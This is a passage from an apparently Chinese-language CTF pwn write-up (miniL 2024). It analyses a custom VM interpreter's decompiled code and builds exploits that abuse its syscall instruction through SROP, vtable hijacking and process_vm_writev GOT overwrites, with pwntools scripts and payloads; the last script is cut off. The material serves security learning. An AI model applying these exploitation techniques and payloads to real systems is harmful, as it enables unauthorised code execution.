      <span class="token keyword">case</span> <span class="token number">0x12LL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>v73 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v73 <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
Error_about_invalid_register<span class="token operator">:</span>
          virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">3LL</span><span class="token punctuation">;</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ERROR: Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v73<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x13LL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v53 <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">6LL</span><span class="token punctuation">;</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ERROR: Syscall limit reached!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        virtual_machine<span class="token operator">-></span>unknow1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v53 <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
        virtual_machine<span class="token operator">-></span>register0 <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>
                                       virtual_machine<span class="token operator">-></span>unknow1<span class="token punctuation">,</span>
                                       virtual_machine<span class="token operator">-></span>register0<span class="token punctuation">,</span>
                                       virtual_machine<span class="token operator">-></span>register1<span class="token punctuation">,</span>
                                       virtual_machine<span class="token operator">-></span>register2<span class="token punctuation">,</span>
                                       virtual_machine<span class="token operator">-></span>register3<span class="token punctuation">,</span>
                                       virtual_machine<span class="token operator">-></span>register4<span class="token punctuation">,</span>
                                       virtual_machine<span class="token operator">-></span>register5<span class="token punctuation">)</span><span class="token punctuation">;</span>
        virtual_machine<span class="token operator">-></span>unknow1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x14LL</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"------------------vmstate------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span>
          <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"pc: %#lx flags: %lx\n"</span><span class="token punctuation">,</span>
          virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">,</span>
          virtual_machine<span class="token operator">-></span>flags_register<span class="token punctuation">,</span>
          v25<span class="token punctuation">,</span>
          v26<span class="token punctuation">,</span>
          v27<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"reg0: %#lx\n"</span><span class="token punctuation">,</span> virtual_machine<span class="token operator">-></span>register0<span class="token punctuation">,</span> v28<span class="token punctuation">,</span> v29<span class="token punctuation">,</span> v30<span class="token punctuation">,</span> v31<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"reg1: %#lx\n"</span><span class="token punctuation">,</span> virtual_machine<span class="token operator">-></span>register1<span class="token punctuation">,</span> v32<span class="token punctuation">,</span> v33<span class="token punctuation">,</span> v34<span class="token punctuation">,</span> v35<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"reg2: %#lx\n"</span><span class="token punctuation">,</span> virtual_machine<span class="token operator">-></span>register2<span class="token punctuation">,</span> v36<span class="token punctuation">,</span> v37<span class="token punctuation">,</span> v38<span class="token punctuation">,</span> v39<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"reg3: %#lx\n"</span><span class="token punctuation">,</span> virtual_machine<span class="token operator">-></span>register3<span class="token punctuation">,</span> v40<span class="token punctuation">,</span> v41<span class="token punctuation">,</span> v42<span class="token punctuation">,</span> v43<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"reg4: %#lx\n"</span><span class="token punctuation">,</span> virtual_machine<span class="token operator">-></span>register4<span class="token punctuation">,</span> v44<span class="token punctuation">,</span> v45<span class="token punctuation">,</span> v46<span class="token punctuation">,</span> v47<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"reg5: %#lx\n"</span><span class="token punctuation">,</span> virtual_machine<span class="token operator">-></span>register5<span class="token punctuation">,</span> v48<span class="token punctuation">,</span> v49<span class="token punctuation">,</span> v50<span class="token punctuation">,</span> v51<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token operator">:</span>
        virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ERROR: Unknown opcode!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现 start_vm处理Instruction的逻辑是 首先判断 Instruction 是否在 Instructlist中(是否是支持的Instruction type) ，之后再根据Instructionlist 找到 Instruction type，根据Instruct type能知道指令有几个操作数，然后去判断指令格式有没有语法错误，之后会走到下面 switch这里 找到对应的Instruction_handler 做处理</p>
<p>阅读Instruction list 还有Instruction handler 可以得知虚拟机中有这些指令， 其中算术运算和逻辑运算指令 两个操作数都是寄存器，读写内存可以使用 LOAD STORE这两个指令，要设置寄存器的值 可以使用 SET指令，jcc相关的指令是通过修改pc寄存器去实现跳转的，HLT能显示寄存器的状态，INT指令可以进行syscall，但是INT指令只能使用一次，代码写的非常safe，对每个数据都有很明确的上下界检查</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9008 aNop            db <span class="token char">'NOP'</span><span class="token punctuation">,</span><span class="token number">0</span>              <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> <span class="token punctuation">.</span>data<span class="token operator">:</span>instruction_list↓o
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A900C aLoad           db <span class="token char">'LOAD'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9011 aStore          db <span class="token char">'STORE'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9017 aMov            db <span class="token char">'MOV'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A901B aAdd            db <span class="token char">'ADD'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A901F aSub            db <span class="token char">'SUB'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9023 aMul            db <span class="token char">'MUL'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9027 aDiv            db <span class="token char">'DIV'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A902B aAnd            db <span class="token char">'AND'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A902F aOr             db <span class="token char">'OR'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9032 aXor            db <span class="token char">'XOR'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9036 aNot            db <span class="token char">'NOT'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A903A aShl            db <span class="token char">'SHL'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A903E aShr            db <span class="token char">'SHR'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9042 aCmp            db <span class="token char">'CMP'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9046 aJmp            db <span class="token char">'JMP'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A904A aJe             db <span class="token char">'JE'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A904D aJne            db <span class="token char">'JNE'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9051 aSet            db <span class="token char">'SET'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9055 aInt            db <span class="token char">'INT'</span><span class="token punctuation">,</span><span class="token number">0</span>
<span class="token punctuation">.</span>rodata<span class="token operator">:</span><span class="token number">00000000004</span>A9059 aHlt            db <span class="token char">'HLT'</span><span class="token punctuation">,</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先看看这个 INT是怎么用的</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">0x13LL</span><span class="token operator">:</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v53 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">6LL</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ERROR: Syscall limit reached!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  virtual_machine<span class="token operator">-></span>unknow1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v53 <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
  virtual_machine<span class="token operator">-></span>register0 <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>
                                 virtual_machine<span class="token operator">-></span>unknow1<span class="token punctuation">,</span>
                                 virtual_machine<span class="token operator">-></span>register0<span class="token punctuation">,</span>
                                 virtual_machine<span class="token operator">-></span>register1<span class="token punctuation">,</span>
                                 virtual_machine<span class="token operator">-></span>register2<span class="token punctuation">,</span>
                                 virtual_machine<span class="token operator">-></span>register3<span class="token punctuation">,</span>
                                 virtual_machine<span class="token operator">-></span>register4<span class="token punctuation">,</span>
                                 virtual_machine<span class="token operator">-></span>register5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  virtual_machine<span class="token operator">-></span>unknow1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>
  <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比如说 syscall read(0,0x114514,0x40) 只需要构造这样的表达式</p>
<pre class="line-numbers language-none"><code class="language-none">SET REG0 0
SET REG1 0x114514
SET REG2 0x40
INT 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>srop??</p>
<p>在调试的过程中，发现有一个行为和atoi函数非常相似的函数，暂且称做atoi吧，在执行的时候会把部分opcode拷贝到栈上，利用这个函数处理数据时截断的性质，同时拷贝opcode的逻辑，拷贝到的位置刚刚好可以到signa frame中rsp rip的位置，可以构造这样的表达式，之后调用rt_sigreturn去劫持rip rsp，但是这样做段寄存器会发生改变，会产生一个段错误导致利用不下去</p>
<pre class="line-numbers language-none"><code class="language-none">payload &#x3D; b&#39;&#39;&#39;
SET REG0 0x460b37
STORE REG0 0x20241000
SET REG0 0x4062f3
STORE REG0 0x20241010

SET REG0 0x404e68
STORE REG0 0x20241020
SET REG0 0x20241000
STORE REG0 0x20241028

SET REG0 0x49688b
STORE REG0 0x20241030
SET REG0 0x1000
STORE REG0 0x20241038

SET REG0 &#39;&#39;&#39; + p64(0x401972) + b&#39;\n&#39;
payload +&#x3D; b&quot;INT 0xf_AAAAAAABBBBBCCCCCCCC&quot;
payload +&#x3D;p64(0x4e4050)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>vtable??</p>
<p>程序是静态链接的，没有pie，所以vtable的地址是固定的，可以通过修改vtable去劫持控制流，做了一些尝试找到了一个关于vprintf的利用链，可以劫持rip，但是这个依赖于syscall read，和本地进程通信用的也不是socket，当时没有考虑到 eof的问题qaq</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import <span class="token operator">*</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">from</span> <span class="token expression">LibcSearcher import <span class="token operator">*</span></span></span>
import itertools
import ctypes
import tty
import socket

<span class="token function">context</span><span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token char">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token char">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token char">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
PORT <span class="token operator">=</span> <span class="token number">9999</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">NOP <span class="token number">0</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">LOAD <span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">STORE <span class="token number">2</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">MOV <span class="token number">3</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">AND <span class="token number">4</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">SUB <span class="token number">5</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">MUL <span class="token number">6</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">DIV <span class="token number">7</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">AND <span class="token number">8</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">OR <span class="token number">9</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">XOR <span class="token number">0xa</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">NOT <span class="token number">0xb</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">SHL <span class="token number">0xc</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">SHR <span class="token number">0xd</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">CMP <span class="token number">0xe</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">JMP <span class="token number">0xf</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">JE <span class="token number">0x10</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">JNE <span class="token number">0x11</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">SET <span class="token number">0x12</span> SET REG0 <span class="token number">40</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">INT <span class="token number">0x13</span> INT syscallnum</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">HLT <span class="token number">0x14</span> HLT</span></span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">bss</span> <span class="token expression"><span class="token operator">=</span> <span class="token number">0x4e4000</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">flag</span><span class="token expression">_str_addr <span class="token operator">=</span> <span class="token number">0x20242000</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">SET REG0 <span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">SET REG1 <span class="token number">0x20242000</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">SET REG2 <span class="token number">40</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">NOT REG5 REG1</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">INT <span class="token number">1</span></span></span>

p <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token string">"./chal"</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token operator">=</span>PTY<span class="token punctuation">,</span>raw<span class="token operator">=</span>False<span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">p</span> <span class="token expression"><span class="token operator">=</span> <span class="token function">remote</span><span class="token punctuation">(</span>IP<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span></span></span>

payload <span class="token operator">=</span> b<span class="token char">''</span>'
SET REG0 <span class="token number">1</span>
SET REG1 <span class="token number">0x4e5d80</span>
SET REG2 <span class="token number">0x200</span>
INT <span class="token number">0</span>
<span class="token char">''</span>'

gdb_comm <span class="token operator">=</span> <span class="token char">''</span>'
b <span class="token operator">*</span><span class="token number">0x41ed7f</span>
c
<span class="token char">''</span>'
# <span class="token number">0x0000000000493675</span> <span class="token operator">:</span> add rax<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>r12<span class="token punctuation">]</span> <span class="token punctuation">;</span> call rax

p<span class="token punctuation">.</span><span class="token function">sendlineafter</span><span class="token punctuation">(</span><span class="token string">"Please input your code (max: 4096), end with EOF:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span>tty<span class="token punctuation">.</span>CEOF<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">p</span><span class="token expression"><span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span>

gdb<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>gdb_comm<span class="token punctuation">)</span>
p<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>b<span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0x0000000000474f21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>process_vm_readv &amp; process_vm_writev</p>
<p>后面才知道有这两个系统调用，这两个系统调用可以把数据从一个进程拷贝到另一个进程，如果pid设置为current process pid的话，可以做到类似于memcpy的事情，然后qemu的pid初始是固定的，开启新进程，新进程的pid是往后递增的，所以可以用getpid获取远程环境的current pid number，然后就能推断出下一次交互的pid号是多少。通过这两个系统调用去修改got表 再配合magic gadget打rop劫持控制流</p>
<p><a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/process_vm_readv.2.html">https://www.man7.org/linux/man-pages/man2/process_vm_readv.2.html</a></p>
<img src="/2024/05/14/miniL2024-pwn/1715173889193.png" class="" width="1715173889193">


<img src="/2024/05/14/miniL2024-pwn/1715174106086.png" class="" width="1715174106086">

<p>需要构造一个lovec的结构体，这个结构体可以用来描述一个数据块</p>
<img src="/2024/05/14/miniL2024-pwn/1715174296519.png" class="" width="1715174296519">
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes
<span class="token keyword">import</span> tty
<span class="token keyword">import</span> socket

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"124.222.230.184"</span>
PORT <span class="token operator">=</span> <span class="token number">10010</span>

<span class="token comment"># NOP 0</span>
<span class="token comment"># LOAD 1</span>
<span class="token comment"># STORE 2</span>
<span class="token comment"># MOV 3</span>
<span class="token comment"># AND 4</span>
<span class="token comment"># SUB 5</span>
<span class="token comment"># MUL 6</span>
